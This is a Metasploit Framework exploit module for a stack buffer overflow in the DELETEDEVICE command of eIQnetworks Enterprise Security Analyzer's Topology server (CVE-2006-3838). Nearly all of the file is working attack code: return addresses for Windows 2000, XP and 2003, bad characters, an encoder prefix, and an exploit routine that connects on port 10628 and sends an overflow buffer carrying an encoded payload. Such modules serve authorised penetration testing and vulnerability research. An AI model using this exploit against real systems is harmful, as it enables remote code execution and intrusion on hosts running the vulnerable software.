##
# $Id: eiqnetworks_esa_topology.rb 4498 2007-03-01 08:21:36Z mmiller $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Windows::Misc::Eiqnetworks_Esa_Topology_DELETEDEVICE < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'eIQNetworks ESA Topology DELETEDEVICE Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in eIQnetworks
				Enterprise Security Analyzer. During the processing of
				long arguments to the DELETEDEVICE command in the Topology
				server, a stacked based buffer overflow occurs.

				This module has only been tested against ESA v2.1.13.

			},
			'Author'         => 'MC',
			'Version'        => '$Revision: 4498 $',
			'References'     => 
				[ 
					['BID', '19164'],
					['CVE', '2006-3838'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'    => 250,
					'BadChars' => "\x00\x0a\x0d\x20",
	      			'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
				},
			'Platform'       => 'win',
			
			'Targets'        =>
				[
					[ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29 } ],
					[ 'Windows XP SP2 English',   { 'Ret' => 0x77d57447 } ],
					[ 'Windows 2003 SP1 English', { 'Ret' => 0x773b24da } ],  
				],

			'Privileged'     => false,

			'DisclosureDate' => 'July 25 2006'
						
			))

			register_options(
			[
				Opt::RPORT(10628)
			], self.class)
	end

	def exploit
		connect

		print_status("Trying target #{target.name}...")

		filler  =  rand_text_alphanumeric(128) + [target.ret].pack('V') + make_nops(20)

		sploit  =  "DELETEDEVICE&" + filler + payload.encoded  

		sock.put(sploit)

		handler
		disconnect				
	end

end
end
